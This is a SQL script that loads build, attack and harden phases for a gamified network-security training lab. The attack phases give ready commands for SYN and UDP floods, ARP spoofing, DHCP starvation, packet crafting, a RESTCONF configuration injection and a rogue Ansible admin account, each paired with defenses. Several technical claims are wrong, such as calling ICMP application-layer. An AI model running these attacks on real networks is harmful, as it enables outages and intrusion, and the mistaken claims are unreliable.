UPDATE lab_phases SET title='TCP vs UDP — Watch the Difference', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Reliable vs connectionless transport</h3><p>TCP guarantees delivery with 3-way handshake, sequence numbers, ACKs, and retransmission. UDP just sends — no handshake, no guarantee, but fast. Both run on top of IP and use port numbers to identify applications.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ TCP · UDP · 3-way handshake · ports · sequence numbers</span></div>
<b>Topology:</b> PC1 (client), PC2 (server), KALI (sniffer). <b>Step 1</b> — On PC2 start a web server: <code>sudo python3 -m http.server 80</code>. <b>Step 2</b> — On Kali, capture TCP: <code>tcpdump -i eth0 -nn tcp port 80 -X</code>. <b>Step 3</b> — On PC1: <code>wget http://192.168.1.200/</code>. In tcpdump, see SYN → SYN-ACK → ACK (handshake), then data transfer. <b>Step 4</b> — Compare UDP with iperf: <code>iperf -s -u</code> on PC2, <code>iperf -c 192.168.1.200 -u</code> on PC1. TCP has handshake, windowing, and sequence numbers; UDP has no handshake.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: Transport Master</span></div>
', is_pro_only=FALSE
WHERE lab_id=29 AND phase='build';
UPDATE lab_phases SET title='Transport-Layer Attacks', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>SYN flood, port scan, and session hijack</h3><p>TCP''s handshake is its weakness — half-open connections exhaust resources. UDP has no protection against flood or spoofing.</p></div>
<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ SYN flood · port scan · UDP flood · TCP RST hijack</span></div>
<b>Attack 1 — SYN flood:</b> <code>sudo hping3 -S -p 80 --flood 192.168.1.200</code>. PC2''s SYN queue fills. <code>netstat -ant | grep SYN_RECV</code> shows hundreds of half-open connections. <b>Attack 2 — Port scan:</b> <code>nmap -sS -p 1-1024 192.168.1.200</code> stealth SYN scan. <b>Attack 3 — UDP flood:</b> <code>sudo hping3 --udp -p 53 --flood 192.168.1.200</code>. <b>Attack 4 — TCP RST hijack:</b> If an attacker predicts the TCP sequence number, they can send a forged RST to close the connection. <code>nmap -sS 192.168.1.200 -p 80</code> shows the sequence number predictability.
<div class="achievement"><span class="medal">⚔️</span><span class="txt">Achievement: Transport Breaker</span></div>
', is_pro_only=TRUE
WHERE lab_id=29 AND phase='attack';
UPDATE lab_phases SET title='API Recon and Exploit', content='
<b>Attack 1 — API enumeration:</b> <code>curl -k -X GET https://192.168.1.1/restconf/data</code> lists all writable paths. <b>Attack 2 — Config injection:</b> <code>curl -k -X PATCH -d ''{"Cisco-IOS-XE-native:hostname":"HACKED"}'' https://192.168.1.1/restconf/data/Cisco-IOS-XE-native:native/hostname -u admin:pass</code>. <b>Attack 3 — Credential brute force against RESTCONF.</b> ', is_pro_only=TRUE
WHERE lab_id=43 AND phase='attack';
UPDATE lab_phases SET title='API Authentication', content='
<b>Step 1</b> — RESTCONF with TLS + AAA: <code>aaa new-model</code> → <code>aaa authentication login default local</code>. <b>Step 2</b> — ACL on HTTP access: <code>ip http access-class 10</code>. ', is_pro_only=TRUE
WHERE lab_id=43 AND phase='harden';
UPDATE lab_phases SET title='Deploy with Ansible', content='
<b>Step 1</b> — Install Ansible: <code>sudo apt install ansible</code>. <b>Step 2</b> — Create inventory: <code>[routers] R1 ansible_host=192.168.1.1</code>. <b>Step 3</b> — Playbook: <code>--- - hosts: routers, tasks: - ios_config: lines: hostname AUTOMATED-R1</code>. <b>Step 4</b> — Run: <code>ansible-playbook pb.yml -u admin -k</code>. ', is_pro_only=FALSE
WHERE lab_id=45 AND phase='build';
UPDATE lab_phases SET title='Synchronise Network Time', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>All devices must agree on the time</h3><p>NTP synchronises clocks across network devices. Accurate timestamps are critical for logging, authentication, and certificate validation. Stratum levels define the hierarchy.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ NTP · stratum · clock sync · time source</span></div>
<b>Topology:</b> R1 (NTP server), SW1 + KALI (clients). <b>Step 1</b> — R1 as NTP server: <code>ntp master 3</code> (stratum 3). <b>Step 2</b> — SW1 as client: <code>ntp server 192.168.1.1</code>. <b>Step 3</b> — Verify: <code>show ntp status</code>, <code>show ntp associations</code>. On Kali: <code>sudo ntpdate -q 192.168.1.1</code>.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: Time Lord</span></div>
', is_pro_only=FALSE
WHERE lab_id=31 AND phase='build';
UPDATE lab_phases SET title='NTP Authentication', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>MD5 authenticate NTP updates</h3><p>NTPv4 supports symmetric key authentication. With a shared key, forged NTP packets are dropped.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ NTP auth · MD5 · trusted-key</span></div>
<b>Step 1</b> — Key on R1: <code>ntp authentication-key 1 md5 NetBreakerKey</code> → <code>ntp authenticate</code> → <code>ntp trusted-key 1</code>. <b>Step 2</b> — Same key on SW1: <code>ntp authentication-key 1 md5 NetBreakerKey</code> → <code>ntp server 192.168.1.1 key 1</code>. <b>Step 3</b> — Verify: Kali''s forged NTP is dropped. <code>show ntp associations</code> still shows only the legitimate server.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: Time Guardian</span></div>
', is_pro_only=TRUE
WHERE lab_id=31 AND phase='harden';
UPDATE lab_phases SET title='Enable SNMP Monitoring', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Read the network health via SNMP</h3><p>SNMP (Simple Network Management Protocol) reads device statistics and can write configuration changes. v2c uses community strings (passwords) in plain text. v3 encrypts everything.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ SNMP v2c · community · OID · MIB walk</span></div>
<b>Topology:</b> SW1 (SNMP agent), Kali (NMS). <b>Step 1</b> — Enable SNMP: <code>snmp-server community public RO</code> (read-only) → <code>snmp-server community private RW</code> (read-write). <b>Step 2</b> — From Kali: <code>snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1</code> reads system info. <code>snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2</code> reads interface info. <b>Step 3</b> — Read the entire MIB: <code>snmpwalk -v2c -c public 192.168.1.1 .1</code>.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: SNMP Reader</span></div>
', is_pro_only=FALSE
WHERE lab_id=32 AND phase='build';
UPDATE lab_phases SET title='Ansible Malicious Playbook', content='
<b>Attack 1—Malicious playbook:</b> If an attacker drops a rogue playbook in the Ansible repo: <code>ios_config: lines: "username attacker privilege 15 password hacked"</code>. <b>Attack 2 — Credential theft from AWX/Tower:</b> Extract credentials from Ansible vault. <b>Attack 3 — Terraform state poisoning:</b> Modify the tfstate file to drift the infrastructure. ', is_pro_only=TRUE
WHERE lab_id=45 AND phase='attack';
UPDATE lab_phases SET title='Build a Multi-Device Topology', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Connect the building blocks of a network</h3><p>A network is built from four device types: hubs (dumb repeaters), switches (intelligent forwarding), routers (inter-network connectivity), and firewalls (security enforcement). In this lab you''ll cable all four types and observe how each handles traffic differently — from a hub that shouts to a switch that whispers and a router that chooses the right road.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Hub · Switch · Router · Firewall · Collision domain</span></div>

## The topology

| Device | Role | Image |
|---|---|---|
| H1 | Legacy hub | Generic hub or L2 switch in hub mode |
| SW1 | Layer-2 switch | IOSvL2 |
| R1 | Router | IOSv |
| FW1 | Firewall | IOSv (or simulated via ACLs) |
| PC1–PC3 | End hosts | VPCS |
| KALI | Observer | Kali Linux |

Cable: PC1 + PC2 → H1 hub → SW1, PC3 + KALI → SW1, SW1 → R1, R1 → FW1.

## Objectives

<ul class="tool-objectives">
<li>Understand the role of each device in a network</li>
<li>Observe collision domains (hub) vs separate collision domains (switch)</li>
<li>Observe the router as a broadcast boundary</li>
</ul>

## Step 1 — Set up addressing

On PC1 (VPCS):
```
ip 192.168.1.10 255.255.255.0 192.168.1.1
```

On PC2:
```
ip 192.168.1.20 255.255.255.0 192.168.1.1
```

On PC3:
```
ip 192.168.1.30 255.255.255.0 192.168.1.1
```

On KALI:
```
sudo ip addr add 192.168.1.100/24 dev eth0
sudo ip route add default via 192.168.1.1
```

## Step 2 — Observe hub behaviour

From PC1, ping PC2 continuously:
```
ping 192.168.1.20 -t
```

While the ping runs, connect PC3 to the same hub. On PC3, start sniffing:
```
sudo tcpdump -i eth0 -nn
```

PC3 sees PC1''s traffic even though it''s not the destination — the hub broadcasts everything.

<div class="callout info"><p><strong>Collision domain:</strong> A hub creates a SINGLE collision domain. If two devices transmit at the same time, a collision occurs. A switch creates a SEPARATE collision domain per port — no collisions, better performance.</p></div>

## Step 3 — Observe switch behaviour

Move PC1 directly to SW1 (bypass the hub). Run the same ping to PC2. PC3 no longer sees the traffic — the switch forwards frames only to the destination port.

Check SW1:
```
show mac address-table
```

The switch has learned where each MAC lives.

## Step 4 — Observe router as broadcast boundary

From PC1, ping 192.168.1.255 (broadcast):
```
ping 192.168.1.255
```

The broadcast reaches all devices on the 192.168.1.0/24 LAN. Now configure a second subnet behind R1 and verify the broadcast does NOT cross the router — routers stop broadcasts at the interface boundary.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Network Architect — you understand the four pillars of every network</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=15 AND phase='build';
UPDATE lab_phases SET title='Troubleshoot Device Failures', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Diagnose misconfigurations and device-level failures</h3><p>Networks fail at the device level in predictable ways: wrong cable type, disabled port, duplex mismatch, speed mismatch. Your mission: identify four deliberate faults placed in the topology and fix them using CLI tools and physical inspection.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ Troubleshooting · duplex · speed · shutdown</span></div>

## The four faults

Each fault disconnects a path between two devices. Your task: find them all.

| Fault | Symptom | Tool |
|---|---|---|
| **Fault 1** — Shutdown port | A port is administratively down | `show interfaces status` |
| **Fault 2** — Duplex mismatch | One side full, other half | `show interfaces` |
| **Fault 3** — Speed mismatch | 100 on one side, 10 on the other | `show interfaces` |
| **Fault 4** — Wrong cable | Straight-through instead of crossover | Visual or `show interfaces` |

## Step 1 — Isolate the faults

From KALI, run a sweep:
```
for ip in 192.168.1.{10,20,30,1}; do echo -n "$ip: "; fping -c 3 $ip 2>&1 | tail -1; done
```

Note which IPs are unreachable.

## Step 2 — Diagnose each fault

On SW1:
```
show interfaces status
show interfaces gi0/1
show interfaces gi0/2
```

Look for: `err-disabled`, `shutdown`, `half-duplex`, `10M` where you expect `100M` or `1G`.

<div class="callout tip"><p>Duplex mismatch is the most common real-world fault. One side shouts (full-duplex talking anytime) while the other listens half the time (half-duplex). Result: massive frame errors on the full-duplex side and late collisions on the half-duplex side.</p></div>

## Step 3 — Fix each fault

Fault 1 (shutdown port):
```
configure terminal
interface gi0/X
 no shutdown
end
```

Fault 2 (duplex):
```
configure terminal
interface gi0/X
 duplex full
end
```

Fault 3 (speed):
```
configure terminal
interface gi0/X
 speed 100
end
```

Fault 4 (cable): Swap the cable or use a crossover cable / MDIX.

## Step 4 — Verify

Re-run the ping sweep. All IPs should respond.

Check for errors:
```
show interfaces gi0/X | include errors
```

All error counters should be 0.

<div class="achievement"><span class="medal">🔧</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Device Doctor — you diagnosed and fixed four hardware-layer faults</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=15 AND phase='attack';
UPDATE lab_phases SET title='Build an IPv6 Network', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>IPv6 — no more NAT, no more private ranges</h3><p>IPv6 uses 128-bit addresses vs IPv4''s 32-bit. No NAT needed — every device gets a globally unique address. SLAAC (Stateless Address Autoconfiguration) assigns addresses without DHCP.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ IPv6 · SLAAC · EUI-64 · global unique · link-local</span></div>
<b>Topology:</b> R1 (gateway) + PC1 + PC2 + KALI. <b>Step 1</b> — Enable IPv6: <code>ipv6 unicast-routing</code> on R1. <code>int gi0/0</code> → <code>ipv6 address 2001:db8:1::1/64</code> → <code>ipv6 enable</code>. <b>Step 2</b> — SLAAC on PC1: <code>sudo ip -6 addr show</code> — auto-assigned 2001:db8:1::xxx address. <b>Step 3</b> — Verify: <code>ping6 2001:db8:1::1</code> from PC1. <code>tracepath6 2001:db8:1::1</code>.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: IPv6 Native</span></div>
', is_pro_only=FALSE
WHERE lab_id=28 AND phase='build';
UPDATE lab_phases SET title='Harden Device Configs', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Prevent device-layer failures before they happen</h3><p>Harden the network against device-level issues: enable CDP/LLDP for inventory, configure interface descriptions, set duplex/speed explicitly (don''t trust autonegotiation on critical links), enable errdisable auto-recovery, and document everything.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Interface docs · errdisable recovery · autonegotiation</span></div>

## Objectives

<ul class="tool-objectives">
<li>Document every interface with descriptions</li>
<li>Set duplex/speed explicitly on trunk links</li>
<li>Enable errdisable auto-recovery</li>
<li>Create a network diagram baseline</li>
</ul>

## Step 1 — Document interfaces

On SW1:
```
configure terminal
interface gi0/1
 description LINK-TO-HUB-PC1-PC2
interface gi0/2
 description LINK-TO-KALI
interface gi0/24
 description UPLINK-TO-R1
end
```

## Step 2 — Explicit duplex/speed on trunks

```
configure terminal
interface gi0/24
 speed 1000
 duplex full
end
```

## Step 3 — Errdisable auto-recovery

```
configure terminal
errdisable recovery cause all
errdisable recovery interval 300
end
```

When a port err-disables (from port-security, BPDU guard, etc.), it automatically recovers after 5 minutes.

## Step 4 — Baseline verification

```
show running-config | include description
show interfaces description
show errdisable recovery
```

Save the output as your network baseline. Compare it against future outputs to detect unauthorised changes.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Foundation Guardian — your devices are documented, hardened, and monitored</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=15 AND phase='harden';
UPDATE lab_phases SET title='Tamper with the Physical Layer', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Physical access = full compromise</h3><p>If an attacker gains physical access to a wiring closet, the network is theirs. Three physical-layer attacks: (1) rogue device tap — plug a hub/Kali between two legitimate devices, (2) console access — if the console port is left in default config, the attacker configures the router without a password, (3) cable disconnection — simple DoS by pulling the right plug.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Physical tap · Console hijack · Cable DoS</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> Physical attacks require PHYSICAL ACCESS. In the real world, lock your wiring closet and secure console ports. This lab demonstrates WHY those precautions exist.</p></div>

## Objectives

<ul class="tool-objectives">
<li>Tap a link by placing Kali as a MITM between SW1 and SW2</li>
<li>Access R1''s console with default settings — full admin access without password</li>
<li>Pull the right cable to DoS a specific subnet</li>
</ul>

## Attack 1 — Physical tap

Place Kali between SW1 and SW2:
- Kali eth0 → SW1 (link to network)
- Kali eth1 → SW2
- Enable IP forwarding on Kali

From Kali:
```
sudo sysctl net.ipv4.ip_forward=1
sudo tcpdump -i eth0 -nn
```

All traffic between SW1 and SW2 passes through Kali. You can observe, modify, or drop it.

## Attack 2 — Console hijack

Connect to R1''s console port (simulated in GNS3):
- In GNS3, right-click R1 → Console
- If no console password is set, you get **privileged EXEC mode immediately**

```
R1>enable
R1#show running-config
```

Full access to the running config — including passwords (encrypted or not).

## Attack 3 — Cable DoS

Identify the cable connecting the server (PC3) to SW1. Disconnect it. PC3 disappears from the network.
```
ping 192.168.1.30
```
No reply. A single unplugged cable takes down a server.

<div class="callout warn"><p><strong>Mitigation:</strong> Port-security detects disconnected/reconnected ports with different MACs. Console ports MUST have a password: <code>line con 0 → password NetBreakerLab → login</code>. Locked wiring closets with RFID access logs are the physical-layer gold standard.</p></div>

<div class="achievement"><span class="medal">🔌</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Wiring Closet Bandit — you owned the network through its weakest link: the cable</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=16 AND phase='attack';
UPDATE lab_phases SET title='Secure the Physical Layer', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Lock down the cables and ports</h3><p>Physical security: console passwords, port-security, shut down unused ports, enable logging for link flaps, document the physical topology. An attacker who can''t touch the wire can''t pull the attacks from Phase 2.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Console password · Port-security · Unused ports · Link flap logging</span></div>

## Objectives

<ul class="tool-objectives">
<li>Set console and enable passwords</li>
<li>Shut down unused switch ports</li>
<li>Enable port-security on all access ports</li>
<li>Log link up/down events</li>
</ul>

## Step 1 — Console password

On R1 and SW1:
```
configure terminal
line con 0
 password NetBreakerLab
 login
end
```

Now console access requires a password.

## Step 2 — Enable password

```
configure terminal
enable secret NetBreakerLab
end
```

The enable password is hashed (MD5) — not visible in the config as plain text.

## Step 3 — Shut down unused ports

```
configure terminal
interface range gi0/5 - 24
 shutdown
end
```

Only the ports you actually use are open. An attacker plugging into an unused port gets nothing — not even a link light.

## Step 4 — Port-security on active ports

```
configure terminal
interface range gi0/1 - 4
 switchport port-security
 switchport port-security maximum 1
 switchport port-security violation shutdown
 switchport port-security mac-address sticky
end
```

## Step 5 — Link flap logging

SW1 logs when a link goes up or down. Check:
```
show logging | include LINK
```

You''ll see each interface state change. In production, forward these logs to a SIEM (Syslog server) to detect physical-layer attacks in real time.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Physical Guardian — the network is now as secure as the cable plant</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=16 AND phase='harden';
UPDATE lab_phases SET title='Trace a Packet Through the Stack', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Follow a ping from application to wire</h3><p>The TCP/IP model has four layers: Application (HTTP, DNS), Transport (TCP, UDP), Internet (IP), and Link (Ethernet). When PC1 pings PC2, the data travels down the stack on PC1, across the wire, and up the stack on PC2. Each layer adds its own header, and each layer on the receiving end strips its counterpart''s header. In this lab, you watch that process in Wireshark.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ TCP/IP · Encapsulation · Headers · Wireshark decode</span></div>

## The topology

| Device | Role | IP |
|---|---|---|
| PC1 | Sender | 10.0.0.10/24 |
| PC2 | Receiver | 10.0.0.20/24 |
| R1 | Gateway | 10.0.0.1/24 |
| KALI | Sniffer | 10.0.0.100/24 |

## Objectives

<ul class="tool-objectives">
<li>Capture a ping (ICMP) in Wireshark and identify each layer''s header</li>
<li>Capture an HTTP exchange and identify the TCP three-way handshake</li>
<li>Match each Wireshark column to a TCP/IP layer</li>
</ul>

## Step 1 — Capture ICMP

On Kali, start tcpdump:
```
sudo tcpdump -i eth0 -nn -X icmp
```

From PC1:
```
ping -c 3 10.0.0.20
```

## Step 2 — Read the layers in the packet

Look at the hex dump. Each layer is visible:

```
Ethernet II  |  IPv4  |  ICMP  |  Payload
14 bytes     | 20 B   |  8 B   |  56 B (data)
```

The Ethernet header shows source and destination MACs — the Link layer.
The IPv4 header shows source and destination IPs, TTL, protocol — the Internet layer.
The ICMP header shows type (8=echo request, 0=reply) — part of the Application layer.

<div class="callout info"><p><strong>Encapsulation in action:</strong> PC1''s ping data starts as an ICMP message. TCP/IP wraps it in an IP packet, then wraps that in an Ethernet frame. PC2 reverses the process — strips Ethernet, strips IP, delivers ICMP to the ping process.</p></div>

## Step 3 — Capture HTTP (simulated)

If you have a web server running on PC2, use wget from PC1:
```
wget http://10.0.0.20/
```

In Wireshark:
- Filter: `tcp.port == 80`
- Look for SYN → SYN-ACK → ACK (three-way handshake — Transport layer)
- Look for GET / HTTP/1.1 (Application layer)
- Look for the TCP sequence numbers tracking the data

## Step 4 — Map Wireshark columns to layers

| Wireshark column | TCP/IP layer | Info |
|---|---|---|
| Source/Dest MAC | Link | Ethernet frame addressing |
| Source/Dest IP | Internet | IP routing |
| Source/Dest Port | Transport | TCP/UDP session |
| Protocol | — | ICMP, TCP, UDP, etc. |
| Info | Application | GET, ping, DNS query |

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Stack Walker — you traced a packet from the application down to the wire and back</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=17 AND phase='build';
UPDATE lab_phases SET title='Craft and Inject at Every Layer', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Attack each layer of the stack</h3><p>Each TCP/IP layer has its own vulnerabilities: Link layer (MAC flooding, ARP spoof), Internet layer (IP spoofing, fragmentation attacks), Transport layer (SYN flood, port scanning), Application layer (HTTP smuggling, DNS poisoning). In this lab you''ll launch an attack at each layer and observe how the receiving host processes — or fails to process — the crafted packet.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ Layer 2–4 attacks · Scapy · SYN flood · fragmentation</span></div>

## Objectives

<ul class="tool-objectives">
<li>Launch a Layer-2 attack (ARP spoof)</li>
<li>Launch a Layer-3 attack (fragmented ping of death-style packet)</li>
<li>Launch a Layer-4 attack (SYN flood against R1)</li>
<li>Observe each attack in Wireshark</li>
</ul>

## Attack 1 — Layer 2: ARP spoof

From Kali, send a forged ARP reply:
```
sudo arpspoof -i eth0 -t 10.0.0.20 10.0.0.10
```

PC2 now thinks PC1''s IP is at Kali''s MAC address. Traffic destined for PC1 arrives at Kali.

Check PC2''s ARP table:
```
arp -n
```

## Attack 2 — Layer 3: Fragmentation attack

Craft an oversized fragmented ICMP packet with Scapy:
```
sudo scapy
>>> send(IP(dst="10.0.0.1", flags="MF")/ICMP()/"X"*1472)
```

The first fragment has More Fragments set. The second fragment overlaps data — classic fragmentation attack.

On R1:
```
show ip traffic | include fragment
```

The fragment counters show the attack.

## Attack 3 — Layer 4: SYN flood

A half-open TCP connection flood:
```
sudo hping3 -S -p 80 --flood -V 10.0.0.1
```

R1''s TCP SYN queue fills up. Legitimate connections may be refused.

On R1:
```
show tcp brief
```

You''ll see many half-open connections in SYN_RECEIVED state.

<div class="callout warn"><p><strong>Each layer has different defenses:</strong> ARP spoof → DAI (Dynamic ARP Inspection). Fragmentation → firewall fragment reassembly limits. SYN flood → TCP intercept or rate-limit.</p></div>

<div class="achievement"><span class="medal">🔪</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Layer Breaker — you hit the network at every level of the stack</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=17 AND phase='attack';
UPDATE lab_phases SET title='Harden the Full Stack', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Defend every layer</h3><p>Defense-in-depth: protect each layer with the appropriate control. Layer 2: port-security + DHCP snooping + DAI. Layer 3: uRPF + ACL + fragmentation limits. Layer 4: TCP intercept + rate-limit. Layer 5–7: application-layer firewall + IPS.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Defense-in-depth · multi-layer hardening</span></div>

## Objectives

<ul class="tool-objectives">
<li>Enable port-security on all access ports (L2)</li>
<li>Enable uRPF on the external interface (L3)</li>
<li>Configure TCP intercept on the router (L4)</li>
<li>Verify all three attacks are blocked</li>
</ul>

## Step 1 — Layer 2 defense

On SW1:
```
configure terminal
interface gi0/1
 switchport port-security maximum 1
 switchport port-security violation shutdown
 switchport port-security mac-address sticky
end
ip dhcp snooping vlan 1
ip arp inspection vlan 1
```

ARP spoofing from Kali is now blocked by DAI.

## Step 2 — Layer 3 defense

On R1:
```
configure terminal
interface gi0/0
 ip verify unicast source reachable-via rx
end
ip icmp rate-limit unreachable 10
```

uRPF drops packets with spoofed source IPs. Rate-limiting protects against ICMP floods.

## Step 3 — Layer 4 defense

```
configure terminal
ip tcp intercept list PROTECT
ip access-list extended PROTECT
 permit tcp any host 10.0.0.1 eq 80
 permit tcp any host 10.0.0.1 eq 443
!
interface gi0/0
 ip tcp intercept mode intercept
 ip tcp intercept max-incomplete low 500
 ip tcp intercept max-incomplete high 1000
end
```

TCP intercept acts as a proxy — the router completes the three-way handshake with the client, and if the handshake succeeds, opens a second connection to the server. SYN flood packets never reach the server.

## Step 4 — Re-run attacks

Try each attack again. Each one is blocked at its respective layer:
- ARP spoof → dropped by DAI
- Fragmentation → dropped by uRPF + rate-limit
- SYN flood → absorbed by TCP intercept

<div class="callout info"><p><strong>Defense-in-depth principle:</strong> Don''t rely on one layer. If an attacker bypasses L2 security (e.g., from a compromised device), L3 stops them. If they bypass L3 (e.g., encapsulated tunnel), L4 catches them. Layerered security means no single point of failure.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Full Stack Guardian — you defended every layer of the TCP/IP model</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=17 AND phase='harden';
UPDATE lab_phases SET title='Harden the CLI', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Lock down the command line</h3><p>CLI hardening: strong passwords, SSH-only, AAA authentication, privilege levels, exec-timeout, logging. Every command the attacker uses should be logged, time-stamped, and sent to a syslog server.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ AAA · privilege levels · exec-timeout · SSH hardening</span></div>

## Step 1 — AAA and strong passwords

```
configure terminal
enable secret NetBreakerLab2026
username admin privilege 15 secret Str0ng!Pass
line con 0
 password ConSole!Pass
 login
line vty 0 4
 transport input ssh
 login local
 exec-timeout 10
end
```

## Step 2 — Disable Telnet and SNMP

```
configure terminal
no ip http server
no ip http secure-server
no snmp-server community private RW
no snmp-server community public RO
end
```

## Step 3 — Log everything

```
configure terminal
logging on
logging 192.168.1.100         ! syslog server
logging trap debugging
service timestamps log datetime msec
logging console
end
```

Every CLI command is logged. An attacker''s keystrokes are recorded forever.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">CLI Guardian — strong credentials, no SNMP, full audit trail</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=18 AND phase='harden';
UPDATE lab_phases SET title='Exploit Addressing Weaknesses', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Attack the addressing scheme</h3><p>IP address-based attacks: IP spoofing (pretend to be a trusted host), subnet enumeration (find all live hosts), DHCP starvation (exhaust the pool), and zero-conf/mDNS attacks (Apple Bonjour / Link-Local). Each exploits assumptions the network makes about who owns which address.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ IP spoof · host discovery · DHCP exhaustion · zeroconf</span></div>

## Attack 1 — Host discovery

Map every live host in LAN A:
```
sudo nmap -sn 192.168.10.0/24
```

The ping sweep reveals every device that responds. You now know: 192.168.10.1 (R1), 10 (PC1), 20 (PC2). That''s the attack surface.

## Attack 2 — IP spoofing

Forge a packet that appears to come from PC1:
```
sudo hping3 -S -a 192.168.10.10 -p 80 192.168.10.1
```

R1 receives a SYN packet supposedly from PC1 (10.10) — but it came from Kali. The router trusts the source IP because it doesn''t verify it came from the right interface.

## Attack 3 — Address exhaustion

Send massive DHCP requests to fill the pool on R1:
```
sudo yersinia dhcp -attack 1 -interface eth0
```

On R1:
```
show ip dhcp pool
show ip dhcp binding | count
```

The pool fills up. A new PC that boots and requests DHCP gets nothing.

<div class="callout tip"><p><strong>Defense:</strong> uRPF (unicast Reverse Path Forwarding) drops packets with source IPs that don''t route back through the receiving interface. It doesn''t block all spoofing, but it stops the most common forms.</p></div>

<div class="achievement"><span class="medal">🎯</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Address Hunter — you mapped, spoofed, and exhausted the IP space</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=19 AND phase='attack';
UPDATE lab_phases SET title='IPv6 Reconnaissance', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Scan and spoof IPv6</h3><p>IPv6 scanning is harder (64-bit host portion = 2^64 addresses), but multicast-based discovery works. SLAAC addresses follow predictable patterns (EUI-64).</p></div>
<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ IPv6 scan · EUI-64 predict · RA spoof</span></div>
